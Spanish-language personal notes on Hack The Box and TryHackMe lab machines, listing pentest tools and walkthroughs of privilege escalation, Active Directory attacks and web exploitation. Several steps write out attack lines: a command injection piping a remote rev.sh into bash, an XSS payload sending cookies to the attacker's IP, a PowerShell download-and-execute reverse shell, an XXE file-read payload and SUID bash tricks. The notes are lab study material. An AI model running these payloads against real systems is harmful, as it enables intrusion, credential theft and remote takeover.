Apuntes htb

-linpeas herramienta para escalar privilegios dentro de linux
-dentro de meterpreter usando comando shell obtengo una shell
-en algunos casos se puede utilziar burpsuite para modificar peticiones 
-solo podre activar php-reverse-shell en el caso de que tenga acceso a ese directorio dentro de la web
-ncat super importante para activar reverse-shells y etc
-search cve CVE.... para buscar por cve dentro de msfconsole
-dirty sock herramienta para crear un usuario con privilegios de sudo
-mimikatz para sacar passwords de windows
-se pueden hacer hashes a los zip que vengan protegidos con password con hashcat(creo que se llamaba asi)
-cuando tenga opcion de ver archivos en texto plano en la web mirarlos todos que normalmente hay passwords guardadas y con ellas probar en ssh y tal
-si es wordpress utilizar script 'wp_admin_shell' con las passwords de antes
-cuando tenga el user.txt debo buscar la root.txt, para ello primero siemrpre mirar mis permisos con sudo -l
-si con initctl puedo iniciar un *.conf tengo que: 
	1. cambiar su cotenido por chmod +s /bin/bash
	2. iniciarlo con /sbin/initctl start {nombreArchivo} 
	3. ejecutar /bin/bash -p
	4. soy root!!!

-a veces si hay puertos con https activado, los certificados proporcionan nuevos hosts
-en la maquina love encuentro un nuevo hosts al que accedo. Ahora puedo escanear urls y como es una web que se encuentra en el otro servidor puedo especificar que escanee localhost:5000 que era un puerto que estaba prohibido
-si nmap no me proporciona mucha informacion, puedo usar nikto
-php8.1.0 tiene un backdoor importante
-cuando este dentro de la otra maquina puedo obtener la clave publica que tiene, copiarla a mi maquina kali(asignarle respectivos permisos) y luego crear authorized_keys en el servidor y copiar la llave publica en ese arechivo
-en la maquina knife tenemos un comando que se llama 'knife exec' con ello podemos obtener una shell tal que {sudo /usr/bin/knife exec -E "exec '/bin/sh -i'"}
-en la maquina cap fue de mucha utildad wirreshark ya que pude acceder a registros anteriores y obtuve la password
-manera nueva de escalar privileggios en linux con CAPABILITIES(getcap -r / 2>/dev/null) para ver las activas
-en el canal de savitar hemos podido comprobar que podemos cambiar los magic number, es decir, para que por ejemplo una subida de archivos a una web lo reconozca como cierto tipo de archivo. Para cambiarlos y subir una shell php basta c
con poner al principio del script GIF8;
-debugfs /dev/sda1 me permitira ver el contenido de ese disco
-netstat -nat | cat /proc/net/tcp --> para ver puertos abiertos en la maquina
-con echo "asajksha" > /dev/pts/<numero> se puede enviar un mensaje a los usuarios que haya en la maquina

PENTESTING WINDOWS CON KERBEROS ACTIVO
-primero usamos 'crackmapexec smb <ip>' es una enumeracion basica del sistema
-en el caso de que observemos que smb esta activo podemos hacer uso de muchas herramientas samba para buscar recursos compartidos a nivel de red, por ejemplo 'smbclient -L <ip> -N' eso me creara un null session sin credentials
-tambien podria probar con 'rpcclient -U "" <ip> -N' que probablemente me deje conectarme a la maquina objectivo mediante rpc. Si lo logro puedo hacer uso de 'enumdomusers' para listar usuarios validos(puede salir NT_STATUS... que siginifica que no funciona)
-tambien podriamos ver si 389 esta activo(esto es LDAP), si lo esta podemos acudir a un script de nmap para realizar algunas comprobaciones 'nmap --script ldap-search <ip>'
-en el caso de que smbclient nos reportase algun directorio activo puedo hacer uso de 'smbmap -u 'null' -H <ip>


PYTHON
/usr/bin/python -c 'import os;os.execl("/bin/sh", "sh","-p")' con ese comando spawneo una shell como root
algunas veces a pesar de tener una clave privada ya, nos piden una passphrase para descifrarla, para ello podemos usar ssh2john

MAQUINAS S4VITAR
-puerto 445 smb. Usar crackmapexec smb <ip> para reportar sistema operativo e info adicional
-openssl s_client -connect <ip:puerto> para inspeccionar certificado ssl. Este certificado nos puede dar pistas sobre dominios existentes.
-la maquina breadcrumbs tenia la peculiaridad que al pasarlo por burpsuite vemos que cuasndo buscamos un libro la peticion hace uso de un parametro method. Si lo ponemos a 1 observamos que hace uso 
de una funcion en php 'file_get_content' que obtiene un archivo de la maquina local. A su vez vemos un error que nos dice que no encuentra el parametro book y si ponemos en la peticion title=test&author=test&book=test&method=1
donde los titulos son ejemplos y donde pone book ponemos una ruta del sistema comprometido, podemos ver el contenido de cualquier archivo
- el comando awk {print $numero} FS = 'delimitador' donde delimitador es algun caracter lo que hace es quedarse con el argumento qwue indiques en numero a partir de ese caracter
- crackmapexec smb <ip> -u <diccionario de usuairos> -p <password> me deberia dar algun usuario valido o no
- buscando con wfuzz se encuentra un archivo llamado cookie.php que es para calcular la cookie de los uusairos. Antes se observo que si no es paul el que se autentifica no te redirige bien a la pagina por lo que calculamos
la cookie de paul y entramos en ../portal desde el navegador
- editthiscookie es una extension de firefox para crear nuevas cookies, aqui necesitabamos un jwt token
- el comando sudo -u <user> bash sirve para spawnear una shell como el usuario user. Lo usamos en la maquina Bashed para de www-data pasar a scriptmanagaer
- el permiso 4755 asigna el suid a cualquier archivo y si lo hago sobre /bin/bash luego puedo ejecutar bash -p y tendre una consola como root
- mediante el protocolo udp siempre hay un puerto muy interesante que suele reportarse como filtered|closed aunque en realidad esta open. Este puerto corre el servicio smnp y se basa de un community string para poder enumerar 
informacion de la maquina. En la maquina Conceal usa primero 'onesixtyone <ip>' para enumerar el sistema y conseguir el community string. Tras ello tira de la herramienta smpwalk para asi conseguir informacion del sistema y obtiene
una PSK(pre shared key) para una vpn.
-Tambien comenta un truquillo tal que coge una mac en snmp para calcular un direccion y con ello poder acceder al puerto 80 mediante ipv6 ya que el firewall estaba implementado para iptables y no para ip6tables
-Si dentro de la shell de windowa ejecuto '[Enviroment]::Is64BitProcess', si me da true significa que estoy ejecutando un proceso nativo de la maquina, si me diese false seguamente tendria problemas mas adelante
-Un comando cuando ya estamos dentro de la maquina para descargar archivos de nuestra maquina local es usar 'iwr -uri <url> -OutFile <nombrearchivo>'
-En la maquina control hace una inyeccion sql que sirve para cualquier sqli
-En la maquina control tambien(min 1:36:54) hay un truco para ejecutar coamdnos como otro usuario
-En la maquina control no deja ejecutar el nc.exe si lo metemos en Temp por lo que tenemos que hacer uso de 'applocker bypass' para encontrar una ruta valida
-Si winpeas detecta que tengo como usuario posibilidad de tocar el registry buscamos el seclogon y modificamos el programa a ejecutar por nuestro netcat, eso me dara una shell como system
-en la maquina bitlab vimos que habia un servidor postresql pero desde la shell no podiamos conectarnos ya que no existia el comando pgsql. Por tanto podemos meternos en php --interactive y crearnos una conexion con PDO.
-Hay un truquillo en las maquinas linux y es que si no me deja transferirme archivos por python o netcat, podemos simplemente en la maquina victima transformarlo a base64, copiamos la salida y en nuestra maquina local decodeamos 
esa salida dirigiendola a un archivo(lo hace en la maquina bitlab)
-En el caso de estar trabajando en windows con ipv6 tenemos el problema de que crackmapexec no lo tiene contemplado(a no ser que descargues la ultima version) por tanto lo que podemos hacer es primero
	1. Insertar en /etc/hosts el nombre de host de la maquina victima
	2. ejecutar en otra terminal socat TCP-LISTEN:445,fork TCP:apt:445
	3. y ahora podemos hacer un crackmapexec smb localhosts
Lo que hace socat es redirigir el trafico que nos entre por el 445 hacia la maquina apt por el puerto 445
-fcrackzip es una herramienta para poder bruteforcear los zip protegidos por pasword
-si tenemos un ntds.dit y un SYSTEM(a veces viene con la extension .bin) podemos hacer uso de secretsdump.py para que nos reporte hashes del sistema
-reg.py(perteneciente al modulo crackmapexec) es una herramienta que teniendo un hash valido puede dumpear informacion interesante de los registros de windows
-maquina inception muy interesante
-en la maquina sink explota la vulnerabilidad llamada http smuggling gracias a que la web hace uso de haproxy, que es vulnerable(mirar esto es portswigger y otros sitios web). Hace un cookie hijacking ya que cuando aumentas el
content-lenght de la segunda peticion se representa informacion sensible con una cookie nueva(la de admin)

WINDOWS ACTIVE DIRECTORY
- utilidad responder para que nos devuelva hashes ntml2 que luego al crackearse sirven para autenticarse. Realmente esta herramienta hace un envenenamiento del trafico por samba(todo ello si samba no estuviese firmado)
-ntml relay es una herramienta potente ya que si primero ejecutas el responder y desde el lado del servidor algun usuario accede a algun recurso no existente, con ntmlrelay puedo pillar sus hashes y con ello ejecutar comandos
- Un ejemplo sobre el uso de estas herramientas
	1. inicio el responder para el envenenamiento del trafico
	2. en github hay mil comandos para entablar una reverse shell mediante powershell por lo que esto es lo que ejecutaremos con el ntmlrelay
	3. me creo un archivo en mi equipo con este comando de powershell y comparto un servidor con python
	4. cuando vaya a lanzar el ntmlrelay lo que indicara mi comando es que interprete un archivo que se encuentra en mi equipo donde ese archivo tendra el comando para entablarme la powershell
- otra herramienta para esta vez jugar con ipv6 seria mitm6. Windows por defecto solicita informarcion para conectarse por ipv6 por tanto en el momento en el que envenenamos el trafico por ipv6, los equipos dentro del dominio toman
como puerta de enlace principal la ip de mi equipo
- ntmlrelayx.py -6 -wh <ipmiequipo> -t smb://<ipotroequipo> -socks -debug -smb2support
	entonces con este comando hacemos el mismo procedimiento que antes, si algun usuario privilegiado sobre el pc de <ipotroequipo> busca un recurso no existente(como la puerta de enlace por defecto se puso la mia) a mi me llega
	el trafico por lo que obtengo si algun usuario es admin
- ahora con proxychains como tengo un sock4 abierto contra mi localhost, si utilizo el comando ' proxychains crackmapexec smb <ipotroequipo> -u <usuario que pille antes> -p <lo que sea, te va a poner pwned> -d <nombredominio>
	si al final pones --sam al final te devuelve el hash ntml2
-cuando tengo una password valida para algun usuario, con psexec.py puedo conectarme al dominio
- con crackmapexec si pongo al final el parametro --ntds vss obtentgo el ntds del usuario que indique con el parametro -u
-wmiexec.py es una herramienta que me permite con solamente el hash, sin romperlo, acceder a la maquina
-evil-winrm es una herramienta para poder explotar el winrm activo, todo ello si cuentas con credenciales validas
-ataque scf muy interesante y chulo
- se puede explotar dcsync con secretdump(el dcsync se da cuando algun usuario tiene la propieda getchangesall y getchanges)
- con whoami /priv veo mis privilegios y si tengo uno que es seImpersonatePrivilege, puedo usar PrintSpoofer.exe para ganar acceso root
- tengo tambien la herramienta hydra para llevar a cabo un ataque de fuerza bruta
- cuando utilizo crackmapexec para validar usuario y password, puede salirme el estado PASSWORD_MUST_CHANGE y en ese caso deberia utilizar smbpasswd

-MAQUINA BASTION
- en este caso tuve que montar en mi sistema imagenes vhd para poder visualizar su contenido, esto se hace ocn mount -t cifs <direccionremota> <direccionlocal> -o user=anonymous

-MAQUINA HEIST
	1. encuentro hashes cisco crackables y dos nombre de usuarios
	2. crackeo estos hashes 
	3. entrando en el apartado issues.php vemos mas nombres de usuarios como por ejemplo hazard
	4. al final usando cme smb 10.10.10.149 -u users.txt -p passwords.txt vemos que hazard:stea... es una password valida
	5. pruebo si puedo conectarme meduiante winrm y no 
	6. usando cme .... --rid-brute, puedo obtener otros nombres de usuarios del sistema 
	7. repito el paso 4 y obtengo otros dos usuarios
	8. pruebo ahora si puedo conectarme por winrm con cme winrm 10.10.10.149 -u chase -p xxxxxxxx 
	9. como si se puede entonces uso evil-winrm
	
	PRIVESC
	1. obersvamos con get-process -name firefox que este navegador esta actuando y antes vimos que habia un servidor web por tanto podemos pensar que se esta autenticando
	2. con procdump.exe podemos obtener la memoria del proceso y quizas pillamos password
	3. entonces nos transferimos el procdump a la maquina remota y ejecutamos "./procdump.exe -ma <idProceso> firefox.dmp"
	4. y nos tranferimos este archivo a nuestro equipo tal que 
		-abrimos con impacket-smbserver un smb en nuestro equipo local
		-en el windows ejecutamos 'net use x: \<miip>\smbfolder /user:xxx xxx
		-en el windows volvemos a ejecutar 'cmd /c "copy archivo X:\"
	5. ahora nos interesa saber cual es el parametro que usa la web para mandar la peticion del login por tanto lo interceptamos con burpsuite, observamos que es login_password
	6. hacemos un strings firefox.dmp | grep "login_password" y obtenemos la contrasela del administrador y con psexec obtenemos acceso al sistema

-MAQUINA ACTIVE
	1. haciendo smbclient vemos que puedo conectarme a un recurso compartido del que extraigo un archivo llamado Groups.xml. Este archivo contiene un usuario y una password encriptada con aes
	2. haciendo uso de gpp-decrypt obtengo la password en texto claro
	3. a continuacion podemos ver que permisos tiene este usuario sobre lso recursos compartidos

-MAQUINA BOUNTYHUNTER
	1. con wfuzz debo hacer fuzzing con extensiones
	2. despues sabiendo que tengo que obtener el db.php hago un ataque de xxe
	3. cabe recordar que para llevar a cabo un ataque xxe debo cubrir todos los campos del xml para que sea efectivo, es decir, en este caso el parser xml tiene 
		<title>, <cve>, ... pues mi xxe injection debe ser por ejemplo ENTITY xxe blabla <title>&xxe <cve>jsjsjs
	4. En esta maquina sabia como funcionaba el codigo ya que viene en el directorio /resources entonces solo debia replicarlo y usarlo en la consola interactiva de la web para poder realizar el ataque
	xxe. Es decir en la consola copie basicamente lo siguiente
	
	
	1.1 var xml = `<?xml  version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
        	<bugreport>
        		<title>&xxe;</title>
        		<cwe>something</cwe>
        		<cvss>something</cvss>
        		<reward>something</reward>
        	</bugreport>`

	Y tras copiarlo no da ninguna salida pero usando la funcion returnSecret obtengo la salida que necesito en base64

	returnSecret(btoa(xml));

	5. Cuando obtengo una password valida, debo ver que usuarios hay en el sistema para acceder por ssh con esta password. Para ello volvemos a usar el xxe de antes pero obtenemos el archivo /etc/passwd
	6. Estamos dentroooo!!
	7. La escalada de privilegios fue un simple sudo -l y ejecutar el script de python y tenia una shell como root

-MAQUINA WINDOWS CON REGLAS DE FIREWALL CONTRA TCP
Podemos encontrarnos con reglas de firewall en la maquina victima que nos impida crearnos una reverse shell mediante tcp o udp. Por ello en el github de nishang hay una reverse shell mediante el protocolo ICMP.

-MAQUINA MINION(INSANE)
-en la maquina minion hace muchos truquillos de conversion en bytes y base64 para poder pasarse archivos de una maquina a otra etc
-muchas veces cuando hago peticiones desde una url a un archivo en base64 puede darme error por el hecho de haya algun + al codificarlo. Para ello podemos hacer lo siguiente, urlencodearlo:
	1. php --interactive
	2. print urlencode("+");
-en los archivos en windows muchas veces puedes ocultar informacion no visible, esto se llama Alternative Data Stream y es lo que deberiamos mirar siempre antes de nada

-MAQUINA ARCHETYPE
	1. Cuando ya he conseguido el usuario y password acceso al servidor de sql microsft. Usando mssqlclient.py
	2. dentro ejecuto los siguientes comandos
		sp_configure 'show advanced options', '1';
		RECONFIGURE
		sp_configure 'xp_cmdshell','1';
		RECONFIGURE
	3. Me descargo en mi maquina la reverse shell oneline de nishang y con "IEX(New-Object Net.WebClient).DownloadString(<url>)" me la paso a la maquina victima y ya obtengo la reverse shell con netcat

-MAQUINA PREVISE
	1. Con el primer escaneo observamos que esta http abierto por lo que accedemos y vemos un login. Investigando un poco nos damos cuenta que por mas que intentemos acceder a otros recursos siempre nos devulve al login por 
	lo que en ese caso pruebo con curl peticiones a otras rutas. Esto funciona y me devuelve el codigo de las otras rutas. Observo que hay un create user por lo que me creare un usuario para poder acceder en el login
	Para ello hago uso de 'curl -F <parametroID>=<valor> -F <parametroID>=<valor> ... <direccion url>' y eso simula el boton submit del formulario. Y funcionooo estoy dentro
	
	2. A continuacion puedo ver que me encuentro en una calle sin salida donde lo unico que podia hacer es descargarme un archivo backup.zip. Cuando lo tengo observo que en logs.php hay un trozo de codigo que ejecuta un script
	en python asi que eurekaaa, inyecto mi payload ahi, simplemente abro burp, ejecuto una peticion desde files_logs.php y en burp modifico el parametro delim=comma y pongo
		'delim=comma%26curl+http://<miip>:80/rev.sh|bash' y me devuelve una shell

	3. Una vez dentro de la maquina podemos acceder ahora si como root a mysql y como tenemos la password podemos ver el ahsh de la password del usuario m4lwhere. Nos conectamos por ssh y tenemos la user.txt
	4. Ahora toca escalar privilegios y podemos ver con sudo -l que podemos ejecutar cierto script como usuario root. El script no se puede modificar pero tira de un comando dentro de la instruccion\
	en concreto del comando 'date ....'. Podemos explotar esto modificando el path para que en vez de ejecutar el comando date del sistema ejecute un script que nosotros llamamos date y que convierta la /bin/bash en suid
	Para ello ejecutamos lo siguiente
		1.1 PATH=/home/m4lwhere/tmp:/usr/bin:/bin
		2.1 export PATH
	Como la primera ruta del path es /home/m4lwhere/tmp, aqui meteremos nuestro sciprt llamado date ya que al ser la primera no se ejecutara el /bin/date.
	
	5. Voilaaa, tenemos shell como root

-MAQUINA LABORATORY
	1. Tras la fase de nmap descubro varios dominios, git.laboratory.htb es el mas interesante ya que presenta un servicio de gitlab
	2. Me registro y observo que la version tiene una vulnerabilidad de lfi, por lo que podemos conseguir archivos
	3. Gitlab se basa en cookies de sesion por lo que la idea es obtener la cookie de sesion del admin de la pagina. Para ello primero obsevamos que obtenemos un secrets.yml donde aparecede una secret-key-base que es la que nos
	interesa.
	4. A continuacion para poder exlpotar esta secret key debemos montar nosotros nuestro propio gitlab en local para poder serializar el objeto(lo mejor es buscar dockerhub gitlab y ya viene hecho)
	5. En local usamos el comando 'docker pull gitlab/gitlab-ce:12.8.1-ce.0'

-MAQUINA DELIVERY
	1. En primer lugar entro, tras el escaneo entro al puerto 80 y veo que redireige a dos webs, helpdesk.delivery.htb y al puerto 8065 que aloja una aplicacion mattermost. 
	2. Accediendo a helpdesk vemos que podemos crear un nuevo ticket por lo que lo creamos y con el nos da un ticket id, nos vamos a revisar nuestro ticket donde introducimos el email 
	que pusimo anteriormente y el ticket id y con ello nos da un link de verificacion de la cuenta <idticket>.delivery.htb que deberiamos haber registrado antes en helpdesk
	3. Ya habiendo verificado el email podemos acceder al servicio mattermost y nos encontramos unas credenciales del servicio ssh (maildeliverer:xxxxxx). Estamos dentro del sistema.
	4. Hay que pensar un poco y decir "joder el sistema mattermost tendra archivos de configuracion donde almacena usuarios, es decir una bd tambien" y asi es, en /opt/mattermost/config/config.json encontramos
	un usuario y password para acceder a un mysql y vemos que hay una tabla Users con la password de root encriptada
	5. Antes leimos un comentario en MatterMost que usando las reglas adecuadas con hashcat podriamos crackear una password derivada de PleaseSuscribe!, por tanto creamos un peque√±o diccionario tal que
	"echo <keyword> | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout > dictionary" y tras eso simplemente "john --wordlist=dictionary <fichero_hash>"

-MAQUINA FRIENDZONE
	1. Tras la enumeracion de puertos vemos que hay un samba, inspeccionandolo podemos observar que accedemos a general y este contiene unas credenciales, en Development podemos subir archivos
	2. La parte importante aqui es dns zone transfer que lo hacemos con "dig axfr frienzone.red @10.10.10.123" lo cual nos descubre otros vhosts que pondremos en el /etc/hosts
	3. Tras esto accedemos a https://administrator1.friendzone.red el cual es un login que tiene las credenciales anteriores como validas
	4. Haciendo uso de gobuster vemos que existe un recurso https://administrator1.friendzone.red/timestamp.php lo que quiere decir que pagename=timestamp carga este archiuvo .php. Anteriormente vimos que en el 
	samba, el directorio Development nos permitia escritura por lo que sabiendo que su ruta dentro de la maquina victima es /etc/Development basta con subir una shell php y ganar rce. "https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php_shell"
	5. Tras hacernos con la shell, dentro de /var/www/ vemos un archivo de bases de datos .conf donde hay una password del usuario friend la cual es valida para conectarnos mediante ssh
	6. Para escalar privilegios, haciendo uso de la herramienta pspy vemos que hay un reporter.py que se ejecuta continuamente y que a su vez importa la libreria os.py de /usr/lib/python2.7/os.py Por tanto podemos crear nosotros
	un os.py que contenga una shell para el crontab, es decir, que escribamos una instruccion para el contrab de que nos de una shell por netcat y asi somos root

-MAQUINA BLOCKY
	1. No me lo encontro la enumeracion de rutas pero existe una llamada '/plugins/ que tiene almacenados archivos interesantes
	2. Como un .jar no es mas que un "zip" basicamente, uso 'unzip Blocky.jar' y puedo ver que hay un .class para decompilar. Cuando lo decompilo online obtengo un user y una password
	3. Entro por ssh y ya puedo ver tanto la user.txt como la root.txt

-MAQUINA MIRAI
	1. Haciendo fuzzing sobre el puerto 80 vemos dos rutas interesantes, una de ellas nos muestra un panel de control de una raspberry por lo que podremos deducir que podemos conectarnos mediante ssh
	con las credenciales por defecto pi:raspberry
	2. Tras ello podemos hacer sudo su, vamos a /root pero nos dice que la flag esta montada en un pednrive por lo que hacemos 'df' para buscar todas las particiones del ordenador. Al final nos sale /media/usbstick
	3. Cuando entramos hay otra nota que dice que la flag ha sido borrada y hay que recuperarla
	4. La unica forma es hacer 'strings /dev/sdb' donde /dev/sdb es la particion del pendrive en realidad

-MAQUINA SHOCKER
	1. En esta maquina se ecneuntra dos puetos abiertos, 80 y 2222(ssh). Tenemos que hacer uso del exploit llamado shellshock para encontrar un archivo llamado user.sh
	2. En este putno podemos hacer uso de 'searchsploit apache mod cgi' y usamos ese script
	3. Ya tenemos conexcion a la maquina y con un simple '/usr/bin/perl -e '/bin/sh' tengo root
	(ADICIONAL). Aqui realizamos un shellshock attack. Podremos realizar este ataque siempre que veamos que se hace uso de un archivo .cgi entonces buscamos en google como realizarlo y hay un articulo de cloudfare que lo explica

-MAQUINA HORIZONTALL
	1. En primer lugar con el escaneo no obtengo mucho, pero si ejecutamos gobuster dns, nos proporciona otro host(api-prod.horizontall.htb), es decir lo metemos en el /etc/host
	2. Esta vez si podemos hacer fuzzing y vemos varias rutas, una de ellas nos conduce hacia un login de una app llamada strapi la cual tiene una vulnerabilidad RCE
	3. Ya tenemos acceso a la maquina y tenemos que pivotar de user
	4. Para ello comprobamos todo y nada pero, si miramos los puertos activos en la maquina vemos que el puerto 8000 esta haciendo uso de laravel v8 la cual es vulnerable a RCE tambien.
	5. Para explotar el exploit debemos hacer port-forwarding sino no funcionara, para ello 
		5.1 en el equipo local nos creamos un par de claves 'ssh-keygen -t rsa -b 2048'
		5.2 el id_rsa.pub lo renombramos como authorized_keys y nos lo llevamos a la maquina remota al fichero /opt/strapi/.ssh donde tenemos escritura
		5.3 ya desde nuestra maquina local ejecutamos 'ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@<ip>'
	6. Ya podemos ejecutar el exploit, por ejemplo como una reverse shell de netcat y nos ponemos en escucha.

-MAQUINA INTELLIGENCE
	1. Vemos que ni smbclient ni rpcclient funcionan por lo que deducimos que la explotacion ha de venir por http
	2. Obersvamos que no podemos acceder a la carpeta /documents pero si a los archivos dentro de la misma
	3. que necesitamos ahora mismo para poder avanzar?? USUARIOS para poder hacer asresproat
	4. Para ello podemos hacer uso de la herramienta exiftool sobre los archiuvos pdf que nos permite descargar la web y tenemos dos usuairos pero no son suficientes
	5. El siguiente paso es crearnos manualmente un exploit que vaya haciendo fuzzing por esos archuivos pdf dentro de /documents a ver si encuentra mas de dos
	6. En este caso si es asi, encuentra muchos mas archuivos que no estaban expuestos en el index.html
	7. Ya he conseguido mi listado de usuarios pero ninguno es vulnerable a asrpesproast
	8. En el archivo 2020-06-04(o algo asi) viene unas instrucciones donde me da una password
	9. probamos con cme smb <ip> -u users -p <password> y un usuario nos sale que es valido
	10. SEGUIRRR!!!

-MAQUINA SCHOOLED
	1. No encontramos nada de fuzzing ni nada hasta que hacemos un fuzzing de subdominios
		-> wfuzz -c --hc=404 -w <wordlist> -H "Host: FUZZ.xxxx.xxxx" http://<ip>
	2. Y encontramos un moodle.schooled.htb
	3. Aqui dentro investigando observamos que podemos enroll en el curso de matematicas y un anuncio dice que todos los que no tengan el moodlenet activado seran eliminados del curso, es decir, el profesor esta comprobando 
	que teiene eso activado. EL PROBLEMA es que ese campo es vulnerable a XSS por lo que si ponemos
		3.1 <script>document.location="http://<ipHTB>/value_cookie="+document.cookie</script>(aunque de un errir 404 deberia estar funcionando) ESTO SE LLAMA COOKIE HIJACKING
		3.2 ejecutamos un servidor con python
	4. Cuando tenemos la cookie buscamos un script que corresponde a lanzt para RCE en moodle
	5. ejecutamos el script con el netcat antiguo de mkfifo y tal y nos devuelve la shell!!
	6. Cuando estamos como www tenemos que pivotar a otro usuario y vemos que en el direcotri principal de moodle hay un config.php que tiene credenciales para el mysql
	7. Cabe recordar que el path esta mal puesto asi que nos lo cpiamos de la maquina nuestra y lo pegamos y ya podemos ejecutar mysql
	8. como no es una consola interactiva debemos hacer uso primero de mysqlshow para ver el nombre de la base de datos y las tablas que teiene
	9. Cogeremos los datos de la tabla mdl_user asi que --> mysql -umoodle -pPlaybookMaster2020 -e "select username,password,email from moodle.mdl_user" moodle
	10. Podemos cracker la password de jamie que es el usuario que existe en la maquina tambien
	11. Ya tenemos el user.txt pero debemos escalar privilegios. Con sudo -l vemos que podemos ejecutar unos comandos
	12. Accedemos a gtfobins.github.io y escribimos pkg y siiii, hay una forma de rce como root
	13. En la maquina remota nos encontramos que no teien fpm pero no pasa nada, es solo una herramienta de compresion de archivos por lo que podemos hacerlo en la maquina local y passarlo a la maquina remota(curl <mip> --output nombre)
	14. Ya somos root siguiendo los pasos

-MAQUINA ACADEMY
	1. En el register.php nos encontramos una casilla de tipo hidden donde puedo elegir rol y si lo ponemos a 1 me da rol admin
	2. Como anteriormente vimos que con wfuzz encontramos un login llamado admin.php entramos ahi y dentro nos encontramos otro host
	3. Entrando a este otro host nos damos cuenta que se tarta de una palicacion de debug de laravel la cual tiene vulnerabilidades(version 5.x)
	4. Con el script que encontramos escrito en python conseguimos rce y con ello una shell interactiva
	5. Para pivotar nos vamos a /var/www/html/academy y leemos el .env
	6. Nos da una password que no funciona para mysql como dice peeero podemos probarla en los distintos usuarios y woalaaaa el usuario es... cry0l1t3
	7. Para pivotar nos damos cuenta que estamos en el grupo adm, es decir, podemos leer archivos dentro de /var/log
	8. Hay un truco y es que si hacemos aureport --tty podemos ver todas las passwords escritas en el sistema(que se almacenarian hexcodeadas en /var/log/audit/audit.log)
	9. Con ello podemos ver la password del usuario mrb3n y el con sudo -l puede hacer uso de composer como root
	10. Buscamos en gtfiobins composer y con ello spawneamos una shell interactiva como root

-MAQUINA DRIVER
	1. En primer lugar con el escaneo observo que estan los tipicos puertos abiertos pero no hay manera de entrar por smb o rpc asi que la clave tiene que estar en http
	2. Tiene un login pero milagrosamente es admin:admin
	3. Ya dentro me deja subir archivos pero claro, ninguna web shell funciona y aqui es donde entra nuestro responder
		3.1 Ejecutamos el responder en local "responder -I tun0"
		3.2 Subimos el archivo @fa.scf que encontramos en iredteam.com cuando buscamos "ntlm force authentication"
		3.3 Tenemos haaaaash
	4. Una vez tenemos hash podemos conectarnos mediante evil-winrm y ala tenemos user.txt
	5. Tras ello solo debemos saber que la escalada de privilegios se basa en el famoso PrintNightmare asi que buscamos el exploit de John Hammond y seguimos los pasos
	6. Ya somos root y maquina lista!


-MAQUINA BASICPENTESTING(THM)
	1. podemos ver un recurso compartido por smb con smbclient -L <ip> -N donde obtenemos dos usuarios
	2. con ello hacemos fuerza bruta con hydra al protocolo ssh

-MAQUINA CTF CHALLENGUE(THM)
	1. dentro de vim con el comando 'shell' puedo spawnear una shell del sistema y asi es como accedo como root

-MAQUINA OVERPASS(THM)]
	1. Vemos una web y tambien una ruta que tiene un login. Podemos ver el codigo del mismo y observamos que podemos reemplazar la cookie con un Broken Autenthication del OWASP top ten. 
	Solo ejecutamos Cookies.set("SessionToken", "") en la consola del navegador, recargamos la pagina y listo
	
	2. Para la escalada de privilegios hemos usado una suplantacion de host. Vimos que en el crontab se llamaba a una direccion relativa y se ejecutaba un script en bash. Por tanto nos creamos un direcotio en nuestra maquina
	local tal y como se llama en la tarea programada, dentro metemos un bash script para reverse shell y por ultimo cambiamos el /etc/hosts del equipo victima para que cuando acceda a overpass.thm se vaya a nuestra ip
	Lo ultimo es ejecutar en nuestra maquina "python3 -m http.server 80" y listooo.


-HERRAMIENTAS
-cewl es un aherramienta para crear diccionario de palabras, es decir, para crackear passwords